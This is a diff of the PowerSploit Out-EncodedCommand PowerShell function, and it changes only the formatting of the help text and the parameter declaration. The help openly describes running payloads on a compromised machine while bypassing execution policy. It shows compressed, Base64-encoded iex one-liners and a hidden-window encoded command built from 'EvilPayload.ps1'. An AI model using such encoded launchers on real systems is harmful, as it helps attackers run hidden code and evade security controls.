@@ -5,12 +5,12 @@ function Out-EncodedCommand
 
 Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.
 
-PowerSploit Function: Out-EncodedCommand
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
- 
+PowerSploit Function: Out-EncodedCommand  
+Author: Matthew Graeber (@mattifestation)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
+
 .DESCRIPTION
 
 Out-EncodedCommand prepares a PowerShell script such that it can be pasted into a command prompt. The scenario for using this tool is the following: You compromise a machine, have a shell and want to execute a PowerShell script as a payload. This technique eliminates the need for an interactive PowerShell 'shell' and it bypasses any PowerShell execution policies.
@@ -49,13 +49,13 @@ Base-64 encodes the entirety of the output. This is usually unnecessary and effe
 
 .EXAMPLE
 
-C:\PS> Out-EncodedCommand -ScriptBlock {Write-Host 'hello, world!'}
+Out-EncodedCommand -ScriptBlock {Write-Host 'hello, world!'}
 
 powershell -C sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Cy/KLEnV9cgvLlFQz0jNycnXUSjPL8pJUVQHAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
 
 .EXAMPLE
 
-C:\PS> Out-EncodedCommand -Path C:\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput
+Out-EncodedCommand -Path C:\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput
 
 powershell -NoP -NonI -W Hidden -E cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcATABjAGkAeABDAHMASQB3AEUAQQBEAFEAWAAzAEUASQBWAEkAYwBtAEwAaQA1AEsAawBGAEsARQA2AGwAQgBCAFIAWABDADgAaABLAE8ATgBwAEwAawBRAEwANAAzACsAdgBRAGgAdQBqAHkAZABBADkAMQBqAHEAcwAzAG0AaQA1AFUAWABkADAAdgBUAG4ATQBUAEMAbQBnAEgAeAA0AFIAMAA4AEoAawAyAHgAaQA5AE0ANABDAE8AdwBvADcAQQBmAEwAdQBYAHMANQA0ADEATwBLAFcATQB2ADYAaQBoADkAawBOAHcATABpAHMAUgB1AGEANABWAGEAcQBVAEkAagArAFUATwBSAHUAVQBsAGkAWgBWAGcATwAyADQAbgB6AFYAMQB3ACsAWgA2AGUAbAB5ADYAWgBsADIAdAB2AGcAPQA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=
 
@@ -72,7 +72,8 @@ This cmdlet was inspired by the createcmd.ps1 script introduced during Dave Kenn
 http://www.exploit-monday.com
 #>
 
-    [CmdletBinding( DefaultParameterSetName = 'FilePath')] Param (
+    [CmdletBinding( DefaultParameterSetName = 'FilePath')]
+    Param (
         [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
         [ValidateNotNullOrEmpty()]
         [ScriptBlock]
